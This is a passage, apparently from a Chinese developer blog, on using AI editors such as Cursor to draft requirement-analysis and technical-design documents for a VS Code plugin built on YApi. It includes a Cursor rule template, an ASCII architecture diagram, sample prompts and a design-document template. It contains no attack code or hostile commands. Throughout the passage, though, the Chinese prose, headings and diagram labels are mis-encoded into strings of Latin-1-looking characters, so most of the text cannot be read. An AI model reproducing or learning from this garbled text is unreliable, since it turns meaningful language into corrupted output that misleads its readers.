<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c786e318f12f4202a89908ac68b2ec26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=eE4YJzVZdh1ruwr3rXobzKHWYPA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ï¼ˆ2ï¼‰ç¼–è¾‘è§„åˆ™ï¼š</strong></p>
<p>ç¼–è¾‘æ–°åˆ›å»ºçš„è§„åˆ™æ–‡ä»¶<code>xxxx.mdc</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56878ba71f724f41b9d967978da9707e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=dCx26wDBe5SbOUWTovq%2FmKKG6Rc%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘æ‰€ä½¿ç”¨çš„è§„åˆ™å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">---
description: éœ€æ±‚åˆ†ææ–‡æ¡£è§„åˆ™
globs: <span class="hljs-emphasis">*.md
alwaysApply: true
---

# éœ€æ±‚åˆ†ææ–‡æ¡£è§„èŒƒ

## è§’è‰²å®šä½
ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æŠ€æœ¯æ–‡æ¡£åŠ©æ‰‹ï¼Œä¸¥æ ¼éµå¾ªæ–‡æ¡£ç»“æ„ï¼Œæä¾›å®Œæ•´çš„ä¿¡æ¯ã€‚

## æ–‡æ¡£ç»“æ„æ¨¡ç‰ˆ

# [äº§å“åç§°]-éœ€æ±‚åˆ†ææ–‡æ¡£

&gt; ç®€è¦ç»™å‡ºä¸€ä¸ªç¬¦åˆå½“å‰éœ€æ±‚è¯­å¢ƒçš„äº§å“åç§°ï¼Œè‹¥ç”¨æˆ·å·²æä¾›åˆ™ç›´æ¥ä½¿ç”¨ã€‚

## 1ã€é¡¹ç›®èƒŒæ™¯

ç®€å•ä»‹ç»ä¸€ä¸‹é¡¹ç›®çš„èƒŒæ™¯ä¸ç—›ç‚¹ï¼Œä»¥åŠæœŸæœ›è§£å†³çš„é—®é¢˜æˆ–è€…è¾¾åˆ°çš„æ•ˆæœã€‚

## 2ã€ç›®æ ‡ç”¨æˆ·

| ç”¨æˆ·ç±»å‹ | ä½¿ç”¨åœºæ™¯ |
|---------|---------|

## 3ã€æ ¸å¿ƒåŠŸèƒ½éœ€æ±‚

ä»‹ç»ä¸€ä¸‹é¡¹ç›®æƒ³è¦å®ç°çš„å„ä¸ªåŠŸèƒ½ç‚¹ï¼Œä»¥åŠç›¸å…³çš„æè¿°ç­‰ä¿¡æ¯

### 3.1ã€åŠŸèƒ½æ¦‚è§ˆ

### 3.2ã€xxåŠŸèƒ½

### 3.3ã€yyåŠŸèƒ½

...

## 4ã€ç•Œé¢è®¾è®¡è¦ç‚¹

æœ¬èŠ‚ç”¨äºæè¿°ä¸»è¦ç•Œé¢å½¢æ€ä¸äº¤äº’ç»“æ„ï¼Œä½¿ç”¨`ASCII`å­—ç¬¦ï¼Œé€šè¿‡ç»“æ„ç¤ºæ„å¸®åŠ©ç†è§£åŠŸèƒ½å¸ƒå±€

\`\`\`markdown
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ğŸ¬ xxå·¥å…·                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
......
\`\`\`
ç»“æ„å›¾ä»…ç”¨äºè¾…åŠ©ç†è§£ï¼Œä¸ä½œä¸ºæœ€ç»ˆäº¤ä»˜ç‰©

## 5ã€æŠ€æœ¯çº¦æŸä¸é™åˆ¶

ä»éœ€æ±‚å±‚é¢è¯´æ˜å¯èƒ½å­˜åœ¨çš„é™åˆ¶æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šä½¿ç”¨ç¯å¢ƒé™åˆ¶ï¼ˆä»…é™æŸäº›ç¼–è¾‘å™¨æˆ–å¹³å°ï¼‰ã€æ•°æ®æ¥æºä¾èµ–ã€æƒé™æˆ–å®‰å…¨ç›¸å…³çº¦æŸ

æœ¬èŠ‚ä¸æ¶‰åŠå…·ä½“æŠ€æœ¯æ–¹æ¡ˆæˆ–å®ç°æ–¹å¼ã€‚

## 6ã€åç»­è¿­ä»£æ–¹å‘

æè¿°å¯èƒ½çš„åç»­æ¼”è¿›æ–¹å‘ï¼Œç”¨äºè¾…åŠ©å†³ç­–ä¸è§„åˆ’ï¼šåŠŸèƒ½å¢å¼ºæ–¹å‘ã€ç”¨æˆ·ä½“éªŒä¼˜åŒ–æ–¹å‘ã€ä¸å…¶ä»–å·¥å…·æˆ–ç³»ç»Ÿçš„è”åŠ¨å¯èƒ½æ€§

æœ¬èŠ‚å†…å®¹ä¸ä¸€å®šå¯è¡Œï¼Œéœ€åœ¨åç»­é˜¶æ®µè¯„ä¼°å¯è¡Œæ€§

## 7ã€å…¶ä»–è¯´æ˜
ä¾‹å¦‚ï¼Œä¸“ä¸šæœ¯è¯­ã€ä¿®è®¢çš„è®°å½•ç­‰ç­‰

### ä¸“ä¸šæœ¯è¯­
| æœ¯è¯­ | è¯´æ˜ |
|-----|------|

### ä¿®è®¢è®°å½•
| ç‰ˆæœ¬ | æ—¥æœŸ | ä¿®è®¢å†…å®¹ | ä½œè€… |
|-----|------|---------|-----|
</span></code></pre>
<p>æ›´å¤šè§„åˆ™å¯ä»¥æ ¹æ®éœ€è¦åœ¨<code>githubä¸Š</code>æŸ¥æ‰¾ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsearch%3Fq%3DCursor%2520rules%26type%3Drepositories" target="_blank" title="https://github.com/search?q=Cursor%20rules&amp;type=repositories" ref="nofollow noopener noreferrer">github.com/search?q=Cuâ€¦</a></p>
<blockquote>
<p>ğŸ’¡æç¤ºï¼šè§„åˆ™çš„æ ¼å¼å¹¶æ²¡æœ‰ä»€ä¹ˆå¼ºåˆ¶è¦æ±‚ï¼Œä½ å¯ä»¥æŒ‰ä½ çš„æƒ³æ³•éšæ„è¾“å…¥ï¼ŒAIÂ æ¨¡å‹ä¼šè‡ªå·±å»è¯»å–å¹¶è§£æä½ çš„è§„åˆ™ã€‚</p>
</blockquote>
<p>å½“éœ€æ±‚åˆ†ææ–‡æ¡£è®¾è®¡å¥½åï¼Œæ¥ä¸‹æ¥å°±åº”è¯¥è€ƒè™‘å…·ä½“å¦‚ä½•å®ç°ï¼Œä»¥åŠè§„åˆ’ä¸€ä¸‹å®ç°çš„æ­¥éª¤ã€‚</p>
<h4 data-id="heading-13">1.4ã€æŠ€æœ¯è®¾è®¡ä¸è§„åˆ’ï¼ˆæŠ€æœ¯æ–¹æ¡ˆÂ +Â å…·ä½“å®ç°æ­¥éª¤ï¼‰</h4>
<p>åœ¨æ¢ç´¢å¯è¡Œçš„å®ç°æ–¹å‘ä¸èƒ½åŠ›è½åœ°è·¯å¾„æ—¶ï¼Œæˆ‘ä»¬äº¦å¯ä»¥å€ŸåŠ©Â AIÂ åœ¨ä¿¡æ¯å½’çº³ã€å¯¹æ¯”åˆ†æä¸ç»“æ„åŒ–è¡¨è¾¾æ–¹é¢çš„ä¼˜åŠ¿ï¼Œä½œä¸ºç ”å‘å‰æœŸçš„é‡è¦è¾…åŠ©å·¥å…·ï¼Œå¸®åŠ©æˆ‘ä»¬æ›´å¿«çš„æ”¶é›†ä¿¡æ¯ã€åˆ†æå¯è¡Œè·¯çº¿ã€‚</p>
<p>ä¸‹é¢æˆ‘ä¼šå…ˆç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œæˆ‘ä»¬å›¢é˜Ÿåœ¨å€ŸåŠ©Â AIÂ è®¾è®¡æŠ€æœ¯æ–¹æ¡ˆæ—¶çš„æœ€ä½³å®è·µæ–¹å¼ã€‚</p>
<h5 data-id="heading-14">1.4.1ã€AIÂ è¾…åŠ©çš„æœ€ä½³å®è·µ</h5>
<p>ä¸€ç§è¡Œä¹‹æœ‰æ•ˆçš„å®è·µæ–¹å¼æ˜¯ï¼š</p>
<ol>
<li><strong>æä¾›å‚è€ƒèµ„æ–™ç»™AIï¼ˆè¿™ä¸€è¿‡ç¨‹ä¹Ÿå¯ä»¥ç›´æ¥è®©Â AIÂ å®Œæˆï¼‰</strong>
<ul>
<li>å¸‚é¢ä¸Šå·²æœ‰çš„åŒç±»äº§å“ã€è§£å†³æ–¹æ¡ˆé“¾æ¥</li>
<li>ç›¸å…³æ–‡ä»¶ã€æ–‡æ¡£ç­‰ä¸Šä¸‹æ–‡ï¼ˆä¾‹å¦‚éœ€æ±‚åˆ†ææ–‡æ¡£ã€YApiå®˜æ–¹æ–‡æ¡£ï¼‰</li>
</ul>
</li>
<li><strong>å¼•å¯¼Â AIÂ è¿›è¡Œæ•´ä½“åˆ†æ</strong>
<ul>
<li>å¯¹æ¯”æ€»ç»“ä¸åŒäº§å“çš„åŠŸèƒ½åˆ’åˆ†å’Œèƒ½åŠ›ä¾§é‡ç‚¹</li>
<li>æç‚¼å…±æ€§ä¸å·®å¼‚</li>
<li>æŠ½è±¡å‡ºé€šç”¨çš„èƒ½åŠ›æ¨¡å‹æˆ–æ¶æ„ç»“æ„</li>
</ul>
</li>
<li><strong>è¾“å‡ºè¾…åŠ©æˆæœ</strong>
<ul>
<li>ç³»ç»Ÿæ¶æ„ç¤ºæ„å›¾</li>
<li>åŠŸèƒ½æ¨¡å—æ‹†åˆ†å»ºè®®</li>
<li>æŠ€æœ¯å®ç°æ€è·¯æ¦‚è§ˆ</li>
</ul>
</li>
</ol>
<blockquote>
<p>âš ï¸Â æç¤ºï¼šAIÂ è¾“å‡ºä»…ä½œä¸ºå‚è€ƒï¼Œä¸ä»£è¡¨æœ€ç»ˆæ–¹æ¡ˆï¼Œå¼€å‘è€…ä»éœ€ç»“åˆå®é™…ä¸šåŠ¡åœºæ™¯è¿›è¡Œåˆ¤æ–­ä¸ä¼˜åŒ–ã€‚</p>
</blockquote>
<h5 data-id="heading-15">1.4.2ã€æ’ä»¶æŠ€æœ¯æ¶æ„æ¦‚è§ˆ</h5>
<p>ç»“åˆå¸‚é¢ä¸Šå·²æœ‰çš„æ’ä»¶èƒ½åŠ›å’Œéœ€æ±‚åˆ†æåï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©Â AIÂ ç”Ÿæˆä¸€ä»½çš„æŠ€æœ¯æ¶æ„å›¾ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">+-------------------------------------------------------------+
|                    VS Code æ’ä»¶å‰ç«¯ï¼ˆWebviewï¼‰                |
|                     React + Messaging                       |
|                                                             |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   |
|  â”‚   ä¸»ç•Œé¢æ¨¡å—        â”‚    â”‚  åˆå§‹åŒ–é…ç½®æ¨¡å—               â”‚   |
|  â”‚ (å…¥å£ + å¸ƒå±€)       â”‚    â”‚ (é¦–æ¬¡ä½¿ç”¨æŒ‡å¼•ã€Tokené…ç½®ç­‰)    â”‚   |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   |
|           â”‚                           â”‚                     |
|           â–¼                           â–¼                     |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   |
|  â”‚  æ•°æ®æ£€ç´¢æ¨¡å—       â”‚    â”‚   æ•°æ®çŠ¶æ€ç®¡ç†ï¼ˆHookï¼‰         â”‚   |
|  â”‚ï¼ˆæœç´¢ | ç¼“å­˜ | ç­›é€‰ï¼‰â”‚    â”‚ - å…³é”®è¯ç¼“å­˜                  â”‚  |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚ - æœç´¢è¯·æ±‚å°è£…                â”‚   |
|           â”‚               â”‚ - æ¥å£è¿”å›é¢„å¤„ç†              â”‚   |
|           â–¼               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” |
|  â”‚                   API æ ‘å±•ç¤ºæ¨¡å—                         â”‚ |
|  â”‚ï¼ˆæ¥å£æ ‘ç»“æ„ã€æ¥å£é¡¹å±•ç¤ºã€äº¤äº’æ“ä½œï¼‰                          â”‚ |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ |
|          â”‚        â”‚        â”‚                               |
|          â–¼        â–¼        â–¼                               |
|   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” |
|   â”‚ æ¥å£é¡¹UI  â”‚ â”‚ é…ç½®ä¸­å¿ƒ â”‚â”‚ å‰ç«¯æ•°æ®å¤„ç†é€»è¾‘                â”‚ |
|   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ |
|                                                             |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” |
|  â”‚ å¯å±•å¼€å®¹å™¨ç»„ä»¶ï¼ˆæŠ˜å /å±•å¼€å†…å®¹åŒºï¼‰                            â”‚ |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ |
|                                                             |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” |
|  â”‚ æ‰¹é‡å¤„ç†è¿›åº¦æ¨¡å—ï¼ˆæ‰¹é‡ç”Ÿæˆä»£ç è¿›åº¦å±•ç¤ºï¼‰                      â”‚ |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ |
+-------------------------------------------------------------+
<span class="hljs-code">           â”‚
           â”‚    VS Code Extension Messagingï¼ˆåŒå‘é€šä¿¡ï¼‰
           â–¼
+-------------------------------------------------------------+
|                      VS Code æ’ä»¶åç«¯                        |
|                    (Extension Host Runtime)                 |
|                                                             |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” |
|  â”‚                    YAPI æ•°æ®æœåŠ¡å±‚                       â”‚ |
|  â”‚ - è·å–é¡¹ç›®åˆ—è¡¨                                           â”‚ |
|  â”‚ - æŸ¥è¯¢æ¥å£è¯¦æƒ…                                           â”‚ |
|  â”‚ - æ¥å£å˜æ›´æ£€æµ‹                                           â”‚ |
|  â”‚ - Token æ ¡éªŒ                                            â”‚ |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ |
|                                                             |
|  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” |
|  â”‚                     ä»£ç ç”Ÿæˆå¼•æ“                         â”‚ |
|  â”‚ - æ ¹æ®æ¥å£ç»“æ„ç”Ÿæˆ TypeScript ç±»å‹/æ–¹æ³•                    â”‚ |
|  â”‚ - å†™å…¥æ–‡ä»¶ç³»ç»Ÿ                                           â”‚ |
|  â”‚ - è°ƒç”¨æ ¼å¼åŒ–å·¥å…·ï¼ˆå¦‚ Prettierï¼‰                           â”‚ |
|  â”‚ - è‡ªåŠ¨æ‰“å¼€/æ›´æ–°æ–‡ä»¶                                      â”‚ |
|  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ |
+-------------------------------------------------------------+
           â”‚
           â”‚ HTTP è°ƒç”¨ï¼ˆYAPI API v1/v2ï¼‰
           â–¼
+-------------------------+
|        YAPI æœåŠ¡ç«¯       |
+-------------------------+
</span>
</code></pre>
<p>å€ŸåŠ©è¯¥æ¶æ„å›¾ï¼Œå¯ä»¥è¾…åŠ©æˆ‘ä»¬ç†è§£åŒç±»å‹æ’ä»¶çš„å®ç°åŸç†ï¼Œå¸®åŠ©æˆ‘ä»¬æ¢³ç†å…¶ä¸­å…³é”®ç‚¹ã€‚</p>
<p>è¯¥ç¯èŠ‚å¹¶ä¸å±€é™äºæ­¤ï¼Œæ—¥å¸¸æˆ‘ä»¬åœ¨é˜…è¯»ä¸‰æ–¹åº“çš„æºç æ—¶ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©Â AIÂ å¿«é€Ÿäº†è§£è®¾è®¡æ¶æ„ï¼Œå¹¶åŸºäºè¯¥è®¾è®¡æ¶æ„é˜…è¯»å…³é”®èŠ‚ç‚¹æºç ã€‚</p>
<h5 data-id="heading-16">1.4.3ã€AIÂ è¾…åŠ©ç”ŸæˆæŠ€æœ¯æ–¹æ¡ˆ</h5>
<p>ä¸‹é¢æˆ‘ç®€å•æ•´ç†äº†ä¸€ä¸‹æç¤ºè¯ï¼Œæˆ‘ä»¬éœ€è¦å°†éœ€æ±‚åˆ†ææ–‡æ¡£ç­‰ç›¸å…³èµ„æ–™éƒ½æä¾›ç»™Â AIã€‚</p>
<ul>
<li>å¦‚æœä½¿ç”¨Â <strong>AIÂ ç¼–è¾‘å™¨</strong>ï¼ˆè¿™é‡Œä»¥<code>Cursor</code>ä¸ºä¾‹ï¼‰ï¼š</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">è¯·æ ¹æ® @éœ€æ±‚åˆ†ææ–‡æ¡£.mdï¼Œ@YApiï¼Œhttps://github.com/zhixiaoqiang/yapi2codeç”Ÿæˆä¸€ä»½æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£ã€‚

æ³¨æ„ï¼Œè¿™åªæ˜¯ä¸€ä¸ªæŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£ï¼Œä¸éœ€è¦å†™å…·ä½“çš„ä»£ç å®ç°ï¼Œåªéœ€è¦å†™æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡å³å¯ã€‚

ç»“æœå¸®æˆ‘ä¿å­˜åˆ° æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£.md ä¸­
</code></pre>
<ul>
<li>å¦‚æœä½¿ç”¨Â <strong>æ™ºèƒ½ä½“å¯¹è¯</strong>å½¢å¼ï¼š</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">è¯·æ ¹æ®å‰é¢çš„éœ€æ±‚åˆ†ææ–‡æ¡£å’Œç›¸å…³å‚è€ƒèµ„æ–™ï¼Œç”Ÿæˆä¸€ä»½ VSCode æ’ä»¶æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£ï¼Œä»…åŒ…å«æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡ï¼Œä¸æ¶‰åŠä»£ç å®ç°ã€‚
</code></pre>
<blockquote>
<p>ğŸ’¡Â æç¤ºï¼šæœ¬æ–‡ç¤ºä¾‹ä»…æ¼”ç¤º<strong>æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡æµç¨‹</strong>ï¼Œé‡ç‚¹åœ¨äºå¦‚ä½•å€ŸåŠ©Â AIÂ è¾…åŠ©æ•´ç†æŠ€æœ¯æ–¹æ¡ˆï¼Œè€Œéå…·ä½“ç¼–ç å®ç°ã€‚</p>
</blockquote>
<p>ç”Ÿæˆçš„æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># äº§å“åç§° - æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£</span>

<span class="hljs-section">## 1ã€åŠŸèƒ½è¦ç‚¹åˆ†æ</span>
ä»‹ç»ä¸€ä¸‹å°†æ ¸å¿ƒåŠŸèƒ½æ‹†è§£åçš„å„ä¸ªæ¨¡å—ï¼Œä¾‹å¦‚ï¼šæ¥å£åˆ—è¡¨æ¨¡å—ã€è®¾ç½®æ¨¡å—

<span class="hljs-section">## 2ã€æŠ€æœ¯æ¶æ„è®¾è®¡</span>
ç³»ç»Ÿæ¶æ„å›¾å›¾ä¾‹ä»¥åŠç›¸å…³è¯´æ˜

<span class="hljs-section">## 3ã€æ ¸å¿ƒæŠ€æœ¯æ–¹æ¡ˆ</span>
ä»‹ç»ä¸€ä¸‹é¡¹ç›®çš„æ ¸å¿ƒæŠ€æœ¯ç‚¹ï¼ŒæŠ€æœ¯éš¾ç‚¹/æŠ€æœ¯äº®ç‚¹

<span class="hljs-section">## 4ã€ä¸šç•Œæ–¹æ¡ˆè°ƒç ”</span>
ä¸šç•Œç±»ä¼¼äº§å“æ–¹æ¡ˆè°ƒç ”ç»“æœï¼Œå‚è€ƒä»·å€¼ç­‰ä¿¡æ¯

<span class="hljs-section">## 5ã€é¡¹ç›®è§„èŒƒè®¾è®¡</span>

<span class="hljs-section">### ä»£ç ç»„ç»‡è§„èŒƒ</span>
\<span class="hljs-code">`\`</span>\`markdown
src/
â”œâ”€â”€ views/                  # è§†å›¾æ¨¡å—
â”‚   â”œâ”€â”€ index.ts
â”‚   â””â”€â”€ services/
â”œâ”€â”€ components/             # å…¬ç”¨ç»„ä»¶æ¨¡å—
â”‚   â”œâ”€â”€ ...
â”œâ”€â”€ hooks/                  # å…¬ç”¨Hook
â”‚   â”œâ”€â”€ ...
â”œâ”€â”€ utils/                  # å·¥å…·æ¨¡å—
â”‚   â”œâ”€â”€ ...
â””â”€â”€ package.json
\<span class="hljs-code">`\`</span>\`

<span class="hljs-section">### è®¾è®¡åŸåˆ™</span>
| åŸåˆ™ | è¯´æ˜ | å®è·µæ–¹å¼ |
|-----|------|---------|
| <span class="hljs-strong">**å•ä¸€èŒè´£**</span> | æ¯ä¸ªæ¨¡å—åªè´Ÿè´£ä¸€ä»¶äº‹ | æ‹†åˆ†ç‹¬ç«‹çš„ Service å’Œ Module |
| <span class="hljs-strong">**å¼€é—­åŸåˆ™**</span> | å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ | ä½¿ç”¨ç­–ç•¥æ¨¡å¼ã€æ’ä»¶æœºåˆ¶ |
| <span class="hljs-strong">**ä¾èµ–å€’ç½®**</span> | ä¾èµ–æŠ½è±¡è€Œéå…·ä½“å®ç° | å®šä¹‰ Interfaceï¼Œä½¿ç”¨ä¾èµ–æ³¨å…¥ |
| <span class="hljs-strong">**æœ€å°çŸ¥è¯†**</span> | æ¨¡å—é—´ä¿æŒæœ€å°ä¾èµ– | ... |

<span class="hljs-section">### æµ‹è¯•ç­–ç•¥</span>
| æµ‹è¯•ç±»å‹ | è¦†ç›–èŒƒå›´ | å·¥å…· |
|---------|---------|-----|
| <span class="hljs-strong">**å•å…ƒæµ‹è¯•**</span> | æ ¸å¿ƒé€»è¾‘ã€å·¥å…·å‡½æ•° | Vitest / Jest |
| <span class="hljs-strong">**é›†æˆæµ‹è¯•**</span> | æ¨¡å—é—´äº¤äº’ | Vitest / Jest |
| <span class="hljs-strong">**E2E æµ‹è¯•**</span> | å®Œæ•´ç”¨æˆ·æµç¨‹ | Playwright |
| <span class="hljs-strong">**æ‰‹åŠ¨æµ‹è¯•**</span> | UI äº¤äº’ã€è¾¹ç•Œåœºæ™¯ | - |

<span class="hljs-section">## 6ã€æŠ€æœ¯é€‰å‹æ€»ç»“</span>

<span class="hljs-section">### æ ¸å¿ƒæŠ€æœ¯æ ˆ</span>
| ç±»åˆ« | é€‰å‹ | è¯´æ˜ |
|-----|------|-----|
| <span class="hljs-strong">**è¯­è¨€**</span> | TypeScript | ç±»å‹å®‰å…¨ï¼Œæé«˜ä»£ç è´¨é‡ |
| <span class="hljs-strong">**UI æ¡†æ¶**</span> | React 18 | ç»„ä»¶åŒ–å¼€å‘ï¼Œç”Ÿæ€ä¸°å¯Œ |

<span class="hljs-section">### å¼€å‘ä¸è´¨é‡ä¿éšœ</span>
| ç±»åˆ« | é€‰å‹ | è¯´æ˜ |
|-----|------|-----|
| <span class="hljs-strong">**ä»£ç è§„èŒƒ**</span> | ESLint + Prettier | ç»Ÿä¸€ä»£ç é£æ ¼ |
| <span class="hljs-strong">**Git è§„èŒƒ**</span> | Conventional Commits | è§„èŒƒåŒ–æäº¤ä¿¡æ¯ |

<span class="hljs-section">## 7ã€é£é™©è¯„ä¼°ä¸åº”å¯¹</span>
è¯´æ˜å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œä¾‹å¦‚æŸä¸ªæ ¸å¿ƒèƒ½åŠ›çš„å®ç°ï¼Œä»¥åŠç›¸å…³å½±å“å’Œå¦‚ä½•åº”å¯¹

<span class="hljs-section">## 8ã€å…¶ä»–å†…å®¹</span>
ä¸“ä¸šæœ¯è¯­ã€ä¿®è®¢è®°å½•ç­‰

</code></pre>
<h5 data-id="heading-17">1.4.4ã€æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£æ¨¡ç‰ˆ</h5>
<p>åŒæ ·çš„ï¼ŒæŠ€æœ¯æ–¹æ¡ˆè§„åˆ™æ¨¡ç‰ˆå¦‚ä¸‹ï¼ˆ<code>Cursor</code>ç›´æ¥ä½¿ç”¨ï¼‰</p>
<pre><code class="hljs language-markdown" lang="markdown">---
description: æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£è§„åˆ™
globs: <span class="hljs-emphasis">*.md
alwaysApply: true
---

# æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£è§„èŒƒ

## è§’è‰²å®šä½
